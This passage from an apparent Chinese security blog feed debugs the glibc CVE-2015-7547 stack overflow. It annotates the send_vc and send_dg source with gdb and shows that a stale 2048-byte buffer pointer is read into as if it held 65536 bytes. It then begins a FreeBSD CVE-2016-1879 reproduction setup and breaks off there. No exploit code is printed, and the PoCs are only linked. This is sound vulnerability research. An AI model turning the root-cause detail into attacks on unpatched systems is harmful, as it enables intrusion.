<h1 id="0x02_漏洞分析">0x02 漏洞分析</h1><h2 id="2-1_运行POC">2.1 运行POC</h2><p>使用gdb启动客户端直接运行，出现崩溃堆栈。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/client_crash.png" alt="crash"></p>
<h2 id="2-2_寻找溢出函数">2.2 寻找溢出函数</h2><p>可以看到栈都被覆盖为0x42424242,根据<a href="https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html" target="_blank" rel="external">google提供的分析</a>,出问题的是send_dg和send_vc函数。分别在send_vc和send_dg上下断点，重新运行程序，会发现先调用send_dg函数再调用send_vc函数。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/finish_dg_vc.png" alt="寻找溢出函数"></p>
<p>可以看出是在send_vc的时候发生了栈溢出。</p>
<p>因为根据<a href="https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html" target="_blank" rel="external">google提供的分析</a>可以知道是在读取socket的时候发生的溢出，可以通过结合源码调试来分析。剔除不需要看的代码，核心代码如下，总共干了四件事。</p>
<p>[1]选择适当的缓存</p>
<p>[2]读取dns包的长度</p>
<p>[3]读取dsn包</p>
<p>[4]判断是否需要读取第二个数据包。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">send_vc</span><span class="params">(res_state statp,</span><br><span class="line">	<span class="keyword">const</span> u_char *buf, <span class="keyword">int</span> buflen, <span class="keyword">const</span> u_char *buf2, <span class="keyword">int</span> buflen2,</span><br><span class="line">	u_char **ansp, <span class="keyword">int</span> *anssizp,</span><br><span class="line">	<span class="keyword">int</span> *terrno, <span class="keyword">int</span> ns, u_char **anscp, u_char **ansp2, <span class="keyword">int</span> *anssizp2,</span><br><span class="line">	<span class="keyword">int</span> *resplen2, <span class="keyword">int</span> *ansp2_malloced)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> HEADER *hp = (HEADER *) buf;</span><br><span class="line">	<span class="keyword">const</span> HEADER *hp2 = (HEADER *) buf2;</span><br><span class="line">	u_char *ans = *ansp;</span><br><span class="line">	<span class="keyword">int</span> orig_anssizp = *anssizp;</span><br><span class="line">	</span><br><span class="line">    [...] 								<span class="comment">//这段干的事情可以无视。							</span></span><br><span class="line">    </span><br><span class="line"> read_len:</span><br><span class="line">  	<span class="comment">//----------------[2]-------------start----------------</span></span><br><span class="line">	cp = (u_char *)&amp;rlen16;</span><br><span class="line">	len = <span class="keyword">sizeof</span>(rlen16);</span><br><span class="line">	<span class="keyword">while</span> ((n = TEMP_FAILURE_RETRY (read(statp-&gt;_vcsock, cp,  </span><br><span class="line">					     (<span class="keyword">int</span>)len))) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		cp += n;</span><br><span class="line">		<span class="keyword">if</span> ((len -= n) &lt;= <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		[...]	<span class="comment">//出错处理无视。</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> rlen = ntohs (rlen16); </span><br><span class="line">	<span class="comment">//----------------[2]-------------end----------------</span></span><br><span class="line">  </span><br><span class="line">  	<span class="comment">//----------------[1]-------------start----------------</span></span><br><span class="line">	<span class="keyword">int</span> *thisanssizp;</span><br><span class="line">	u_char **thisansp;</span><br><span class="line">	<span class="keyword">int</span> *thisresplenp;</span><br><span class="line">	<span class="keyword">if</span> ((recvresp1 | recvresp2) == <span class="number">0</span> || buf2 == <span class="literal">NULL</span>) &#123; <span class="comment">//第一次从read_len开始读取网络包进入这个分支。</span></span><br><span class="line">		thisanssizp = anssizp;							<span class="comment">//第一次调用read时可用内存65536</span></span><br><span class="line">		thisansp = anscp ?: ansp;						<span class="comment">//第一次调用read时使用的缓存anscp	</span></span><br><span class="line">		assert (anscp != <span class="literal">NULL</span> || ansp2 == <span class="literal">NULL</span>);</span><br><span class="line">		thisresplenp = &amp;resplen;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (*anssizp != MAXPACKET) &#123; </span><br><span class="line">			[...]										<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* The first reply did not fit into the</span><br><span class="line">			   user-provided buffer.  Maybe the second</span><br><span class="line">			   answer will.  */</span></span><br><span class="line">			*anssizp2 = orig_anssizp;					<span class="comment">//第二次调用时可用内存长度65536</span></span><br><span class="line">			*ansp2 = *ansp;								<span class="comment">//第二次调用read时使用的缓存ansp</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		thisanssizp = anssizp2;</span><br><span class="line">		thisansp = ansp2;</span><br><span class="line">		thisresplenp = resplen2;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//----------------[1]-------------end----------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	anhp = (HEADER *) *thisansp;	</span><br><span class="line"></span><br><span class="line">	*thisresplenp = rlen;</span><br><span class="line">	<span class="keyword">if</span> (rlen &gt; *thisanssizp) &#123; </span><br><span class="line">		[...]		<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		len = rlen;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (len &lt; HFIXEDSZ))       &#123;</span><br><span class="line">		[...]		<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cp = *thisansp; <span class="comment">//*ansp;</span></span><br><span class="line">  	<span class="comment">//---------------[2]--------------------start-----------------</span></span><br><span class="line">	<span class="keyword">while</span> (len != <span class="number">0</span> &amp;&amp; (n = read(statp-&gt;_vcsock, (<span class="keyword">char</span> *)cp, (<span class="keyword">int</span>)len)) &gt; <span class="number">0</span>)&#123; <span class="comment">//溢出点。</span></span><br><span class="line">		cp += n;</span><br><span class="line">		len -= n;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//---------------[2]--------------------start-----------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (n &lt;= <span class="number">0</span>))       &#123;</span><br><span class="line">		[...]		<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (truncating))       &#123;</span><br><span class="line">		[...]		<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * If the calling application has bailed out of</span><br><span class="line">	 * a previous call and failed to arrange to have</span><br><span class="line">	 * the circuit closed or the server has got</span><br><span class="line">	 * itself confused, then drop the packet and</span><br><span class="line">	 * wait for the correct one.</span><br><span class="line">	 */</span></span><br><span class="line">  	</span><br><span class="line">  	<span class="comment">//---------------[4]--------------------start-----------------</span></span><br><span class="line">	<span class="keyword">if</span> ((recvresp1 || hp-&gt;id != anhp-&gt;id)					<span class="comment">//不进。</span></span><br><span class="line">	    &amp;&amp; (recvresp2 || hp2-&gt;id != anhp-&gt;id)) &#123;</span><br><span class="line">		[...]		<span class="comment">//重现流程中不会进入这块。</span></span><br><span class="line">		<span class="keyword">goto</span> read_len;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Mark which reply we received.  */</span></span><br><span class="line">	<span class="keyword">if</span> (recvresp1 == <span class="number">0</span> &amp;&amp; hp-&gt;id == anhp-&gt;id) 				<span class="comment">//第一次运行recvresp1=1 recvresp2=0</span></span><br><span class="line">	  recvresp1 = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  recvresp2 = <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* Repeat waiting if we have a second answer to arrive.  */</span></span><br><span class="line">	<span class="keyword">if</span> ((recvresp1 &amp; recvresp2) == <span class="number">0</span>)						<span class="comment">// 调用goto，回到前面。</span></span><br><span class="line">		<span class="keyword">goto</span> read_len;</span><br><span class="line">	<span class="comment">//---------------[4]--------------------end-----------------</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * All is well, or the error is fatal.  Signal that the</span><br><span class="line">	 * next nameserver ought not be tried.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">return</span> resplen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据源码分析，从socket读取网络包数据的时候是溢出的地方，所以在这里下断点。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb&gt; <span class="tag">b</span> res_send<span class="class">.c</span>:<span class="number">853</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/send_vc_read.png" alt="寻找溢出函数"></p>
<p>通过调用栈可以得知，read发生了两次[4]，而且第一次是正确的，在第二次read之后发生了溢出。通过[1]可以得知，在两次调用read的时候cp指向的内存不同。</p>
<p>第一次调用<code>read</code>函数时，缓冲区为<strong>anscp</strong>指向的内存。</p>
<p>第二次调用<code>read</code>函数时，缓冲区为<strong>ansp</strong>指向的内存。<strong>这里暂时不用考虑二级指针的问题。</strong></p>
<p>可以断定，ansp指针索引的地址出现了问题。ansp是调用时从参数传入的。所以需要通过分析send_vc的调用函数。</p>
<h2 id="2-3_内存分配错误">2.3 内存分配错误</h2><p>send_vc的调用函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__libc_res_nsend(res_state statp, <span class="keyword">const</span> u_char *buf, <span class="keyword">int</span> buflen,</span><br><span class="line">		 <span class="keyword">const</span> u_char *buf2, <span class="keyword">int</span> buflen2,</span><br><span class="line">		 u_char *ans, <span class="keyword">int</span> anssiz, u_char **ansp, u_char **ansp2,</span><br><span class="line">		 <span class="keyword">int</span> *nansp2, <span class="keyword">int</span> *resplen2, <span class="keyword">int</span> *ansp2_malloced)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (v_circuit))       &#123;</span><br><span class="line">			<span class="comment">/* Use VC; at most one attempt per server. */</span></span><br><span class="line">			<span class="keyword">try</span> = statp-&gt;retry;</span><br><span class="line">			n = send_vc(statp, buf, buflen, buf2, buflen2,	<span class="comment">//statp状态，buff，bufflen第一组发送数据，buff，2bufflen2第二组发送数据。</span></span><br><span class="line">				    &amp;ans, &amp;anssiz, &amp;terrno,					<span class="comment">//u_char **ansp, int *anssizp,int *terrno,</span></span><br><span class="line">				    ns, ansp, ansp2, nansp2, resplen2,		<span class="comment">//int ns, u_char **anscp, u_char **ansp2, int *anssizp2,int *resplen2, 				</span></span><br><span class="line">				    ansp2_malloced);						<span class="comment">//int *ansp2_malloced</span></span><br><span class="line">			<span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> (-<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> (n == <span class="number">0</span> &amp;&amp; (buf2 == <span class="literal">NULL</span> || *resplen2 == <span class="number">0</span>))</span><br><span class="line">				<span class="keyword">goto</span> next_ns;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* Use datagrams. */</span>							<span class="comment">//经过send_dg函数调用，ansp指向65536buff，ans指向2048buff。</span></span><br><span class="line">			n = send_dg(statp, buf, buflen, buf2, buflen2,</span><br><span class="line">				    &amp;ans, &amp;anssiz, &amp;terrno,</span><br><span class="line">				    ns, &amp;v_circuit, &amp;gotsomewhere, ansp,</span><br><span class="line">				    ansp2, nansp2, resplen2, ansp2_malloced);</span><br><span class="line">			<span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> (-<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> (n == <span class="number">0</span> &amp;&amp; (buf2 == <span class="literal">NULL</span> || *resplen2 == <span class="number">0</span>))</span><br><span class="line">				<span class="keyword">goto</span> next_ns;</span><br><span class="line">			<span class="keyword">if</span> (v_circuit)</span><br><span class="line">			  <span class="comment">// <span class="label">XXX Check whether both requests failed or     Z</span></span></span><br><span class="line">			  <span class="comment">// <span class="label">XXX whether one has been answered successfully</span></span></span><br><span class="line">				<span class="keyword">goto</span> same_ns;</span><br><span class="line">		&#125;</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为在调用<code>send_vc</code>之前程序先调用了<code>send_dg</code>，且两个函数参数基本相同，通过阅读源码会发现，<code>send_dg</code>对参数进行修改及新内存的申请。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">send_dg</span><span class="params">(res_state statp,</span><br><span class="line">	<span class="keyword">const</span> u_char *buf, <span class="keyword">int</span> buflen, <span class="keyword">const</span> u_char *buf2, <span class="keyword">int</span> buflen2,</span><br><span class="line">	u_char **ansp, <span class="keyword">int</span> *anssizp,</span><br><span class="line">	<span class="keyword">int</span> *terrno, <span class="keyword">int</span> ns, <span class="keyword">int</span> *v_circuit, <span class="keyword">int</span> *gotsomewhere, u_char **anscp,</span><br><span class="line">	u_char **ansp2, <span class="keyword">int</span> *anssizp2, <span class="keyword">int</span> *resplen2, <span class="keyword">int</span> *ansp2_malloced)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  	<span class="comment">//ans指向大小为2048的缓冲器</span></span><br><span class="line"> 	<span class="comment">//ansp指向ans</span></span><br><span class="line">  	<span class="comment">//anscp指向ans</span></span><br><span class="line">	<span class="keyword">const</span> HEADER *hp = (HEADER *) buf;</span><br><span class="line">	<span class="keyword">const</span> HEADER *hp2 = (HEADER *) buf2;</span><br><span class="line">	u_char *ans = *ansp;</span><br><span class="line">	<span class="keyword">int</span> orig_anssizp = *anssizp;</span><br><span class="line">	<span class="keyword">struct</span> timespec now, timeout, finish;</span><br><span class="line">	<span class="keyword">struct</span> pollfd pfd[<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">int</span> ptimeout;</span><br><span class="line">	<span class="keyword">struct</span> sockaddr_in6 from;</span><br><span class="line">	<span class="keyword">int</span> resplen = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">    </span><br><span class="line">  	[...]</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (pfd[<span class="number">0</span>].revents &amp; POLLIN) &#123;</span><br><span class="line">		<span class="keyword">int</span> *thisanssizp;</span><br><span class="line">		u_char **thisansp;</span><br><span class="line">		<span class="keyword">int</span> *thisresplenp;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((recvresp1 | recvresp2) == <span class="number">0</span> || buf2 == <span class="literal">NULL</span>) &#123;	<span class="comment">//send_dg第一次进入这个分支。</span></span><br><span class="line">			thisanssizp = anssizp;</span><br><span class="line">			thisansp = anscp ?: ansp;						<span class="comment">//thisansp被赋值为anscp</span></span><br><span class="line">			assert (anscp != <span class="literal">NULL</span> || ansp2 == <span class="literal">NULL</span>);</span><br><span class="line">			thisresplenp = &amp;resplen;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			[...]											<span class="comment">//第一次调用不会进入。</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (*thisanssizp &lt; MAXPACKET</span><br><span class="line">		    <span class="comment">/* Yes, we test ANSCP here.  If we have two buffers</span><br><span class="line">		       both will be allocatable.  */</span></span><br><span class="line">		    &amp;&amp; anscp</span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifdef</span> FIONREAD</span></span><br><span class="line">		    &amp;&amp; (ioctl (pfd[<span class="number">0</span>].fd, FIONREAD, thisresplenp) &lt; <span class="number">0</span></span><br><span class="line">			|| *thisanssizp &lt; *thisresplenp)</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">                    ) &#123;</span><br><span class="line">			u_char *newp = <span class="built_in">malloc</span> (MAXPACKET);</span><br><span class="line">			<span class="keyword">if</span> (newp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				*anssizp = MAXPACKET;						<span class="comment">//anssizp谁为65536</span></span><br><span class="line">				*thisansp = ans = newp;						<span class="comment">//anscp指向65536的buffer,但是ansp指向仍然指向原来的2048的buffer</span></span><br><span class="line">				<span class="keyword">if</span> (thisansp == ansp2)</span><br><span class="line">				  *ansp2_malloced = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/send_dg_malloc_bug.png" alt="寻找溢出函数"></p>
<p>通过调试可以看出，ansp仍然指向大小为2048的缓冲区，而anscp指向了大小为65536的缓冲区。之后这两个指针又被传递给了send_vc。</p>
<h2 id="2-4_溢出原因">2.4 溢出原因</h2><p>​    所以溢出的原因是，<code>*anssizp</code>因为在之前的<code>send_dg</code>中被赋值为65536，<code>send_vc</code>中第二次调用<code>read</code>函数时，认为ansp指向的缓冲区的大小为<code>*anssizp</code>即65536，而实际上ansp指向了一块只有2048大小的缓冲区。所以在从socket读取大于2048个字节之后产生了栈溢出。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/cve_2015_7547/cve_2015_7547_poc.png" alt="寻找溢出函数"></p>
<h1 id="0x03_参考&amp;感谢">0x03 参考&amp;感谢</h1><p>​    感谢分享：）</p>
<ol>
<li><p>CVE-2015-7547 — glibc getaddrinfo() stack-based buffer overflow</p>
<p><a href="https://sourceware.org/ml/libc-alpha/2016-02/msg00416.html" target="_blank" rel="external">https://sourceware.org/ml/libc-alpha/2016-02/msg00416.html</a></p>
</li>
<li><p>Linux glibc再曝漏洞：可导致Linux软件劫持</p>
<p><a href="http://www.freebuf.com/news/96244.html" target="_blank" rel="external">http://www.freebuf.com/news/96244.html</a></p>
</li>
<li><p>CVE-2015-7547: glibc getaddrinfo stack-based buffer overflow</p>
<p><a href="https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html" target="_blank" rel="external">https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html</a></p>
</li>
<li><p>glibc编译debug版本</p>
<p><a href="http://blog.csdn.net/jichl/article/details/7951996" target="_blank" rel="external">http://blog.csdn.net/jichl/article/details/7951996</a></p>
</li>
<li><p>glibc的编译和调试 </p>
<p><a href="http://blog.chinaunix.net/uid-20786208-id-4980168.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-20786208-id-4980168.html</a></p>
<p>​</p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_漏洞信息">0x00 漏洞信息</h1><p>​    最近glibc有一个栈溢出的漏洞具体情况，漏洞的具体信息可以参考下面两个链接。</p>
<p>​    <a href="http://www.freebuf.com/news/96244.html">Linux glibc再曝漏洞：可导致Linux软件劫持</a></p>
<p>​    <a href="https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html">CVE-2015-7547: glibc getaddrinfo stack-based buffer overflow</a></p>
<p>​    poc在上面的链接中可以下载。</p>]]>
    
    </summary>
    
      <category term="dns" scheme="http://yoursite.com/tags/dns/"/>
    
      <category term="gethostbyname" scheme="http://yoursite.com/tags/gethostbyname/"/>
    
      <category term="glibc" scheme="http://yoursite.com/tags/glibc/"/>
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
      <category term="stackoverflow" scheme="http://yoursite.com/tags/stackoverflow/"/>
    
      <category term="CVE" scheme="http://yoursite.com/categories/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1879 调试&分析]]></title>
    <link href="http://yoursite.com/2016/02/09/CVE-2016-1879%E8%B0%83%E8%AF%95&%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2016/02/09/CVE-2016-1879调试&分析/</id>
    <published>2016-02-09T22:23:13.000Z</published>
    <updated>2016-03-24T03:35:40.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_漏洞介绍">0x00 漏洞介绍</h1><p>​    <a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html" target="_blank" rel="external">CVE-2016-1879</a>是一个会导致freebsd内核崩溃的一个漏洞。漏洞的具体细节看<a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html" target="_blank" rel="external">这里</a>。</p>
<a id="more"></a>
<h1 id="0x01_准备工作">0x01 准备工作</h1><h2 id="1-1_系统安装">1.1 系统安装</h2><p>​    测试系统为FreeBSD-10.1，镜像下载地址点<a href="http://ftp.freebsd.org/pub/FreeBSD/releases/ISO-IMAGES/10.1/FreeBSD-10.1-RELEASE-amd64-disc1.iso" target="_blank" rel="external">这里</a>，大概600M+。注意安装的时候需要选上拷贝内核源码。</p>
<p>​    我在测试的时候poc使用kali-linux运行的。</p>
<h2 id="1-2_重编内核">1.2 重编内核</h2><p>​    因为需要调试FreeBSD的内核，所以需要一个带有debug符号的内核版本。我安装完虚拟机之后发现没有调试符，所以我重新编译了内核。具体过程就不复述了看<a href="https://www.freebsd.org/doc/zh_CN.UTF-8/books/handbook/kernelconfig-building.html" target="_blank" rel="external">这里</a>,配置文件<strong>默认</strong>是<strong>有调试信息</strong>的，所以不需要修改内核的配置文件直接编译安装即可。</p>
<h2 id="1-3_其他设置">1.3 其他设置</h2><ul>
<li>当freebsd内核崩溃时保存dump文件,应该是默认开着的，检查/etc/rc.conf文件。</li>
<li>允许root账号ssh远程登录，这样比较方便，不用ssh远程登录也是可以的。方法在<a href="http://www.unixmen.com/enable-root-login-ssh-freebsd-10/" target="_blank" rel="external">这里</a>。</li>
<li><a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html" target="_blank" rel="external">poc</a>在kali linux系统中不需要配置直接通过python poc.py即可运行，其他系统可能需要自己安装依赖。</li>
</ul>
<h2 id="1-4_网络环境">1.4 网络环境</h2><p>​    两台虚拟机均选择nat模式接入网络即可。</p>
<h1 id="0x02漏洞重现">0x02漏洞重现</h1><p>​    获取freebsd的mac地址与ipv6地址。</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@:~ <span class="comment"># ifconfig</span></span><br><span class="line">em0: <span class="keyword">flags</span>=<span class="number">8843</span><span class="variable">&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt;</span> metric <span class="number">0</span> mtu <span class="number">1500</span></span><br><span class="line">	options=<span class="number">9</span>b<span class="variable">&lt;RXCSUM,TXCSUM,VLAN_MTU,VLAN_HWTAGGING,VLAN_HWCSUM&gt;</span></span><br><span class="line">	ether <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:f8:<span class="number">4</span>d:dd</span><br><span class="line">	<span class="keyword">inet6</span> fe80::<span class="number">20</span>c:<span class="number">29</span>ff:fef8:<span class="number">4</span>ddd%em0 prefixlen <span class="number">64</span> scopeid <span class="number">0</span>x1 </span><br><span class="line">	<span class="keyword">inet</span> <span class="number">172.16</span>.<span class="number">9.186</span> netmask <span class="number">0</span>xffffff00 broadcast <span class="number">172.16</span>.<span class="number">9.255</span> </span><br><span class="line">	nd6 options=<span class="number">23</span><span class="variable">&lt;PERFORMNUD,ACCEPT_RTADV,AUTO_LINKLOCAL&gt;</span></span><br><span class="line">	media: Ethernet autoselect (<span class="number">1000</span>baseT <span class="variable">&lt;full-duplex&gt;</span>)</span><br><span class="line">	status: active</span><br><span class="line">lo0: <span class="keyword">flags</span>=<span class="number">8049</span><span class="variable">&lt;UP,LOOPBACK,RUNNING,MULTICAST&gt;</span> metric <span class="number">0</span> mtu <span class="number">16384</span></span><br><span class="line">	options=<span class="number">600003</span><span class="variable">&lt;RXCSUM,TXCSUM,RXCSUM_IPV6,TXCSUM_IPV6&gt;</span></span><br><span class="line">	<span class="keyword">inet6</span> ::<span class="number">1</span> prefixlen <span class="number">128</span> </span><br><span class="line">	<span class="keyword">inet6</span> fe80::<span class="number">1</span>%lo0 prefixlen <span class="number">64</span> scopeid <span class="number">0</span>x2 </span><br><span class="line">	<span class="keyword">inet</span> <span class="number">127.0</span>.<span class="number">0.1</span> netmask <span class="number">0</span>xff000000 </span><br><span class="line">	nd6 options=<span class="number">21</span><span 